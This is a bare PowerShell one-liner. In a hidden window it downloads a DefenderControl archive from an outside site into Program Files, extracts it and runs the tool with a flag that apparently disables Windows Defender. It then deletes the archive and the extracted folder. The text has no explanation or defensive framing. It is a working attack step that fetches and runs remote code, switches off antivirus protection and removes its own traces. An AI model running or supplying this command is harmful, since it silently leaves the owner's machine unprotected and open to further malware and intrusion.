PowerShell -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('https://www.sordum.org/files/download/defender-control/DefenderControl.zip','C:\Program Files\defender.zip');Expand-Archive -path 'C:\Program Files\defender.zip' -destinationpath 'C:\Program Files\';Set-Variable abc 'C:\Program Files\DefenderControl\DefenderControl.exe';Start-Process $abc /D;Remove-Item 'C:\Program Files\defender.zip';Start-Sleep -s 7;Remove-Item 'C:\Program Files\DefenderControl\' -Recurse;









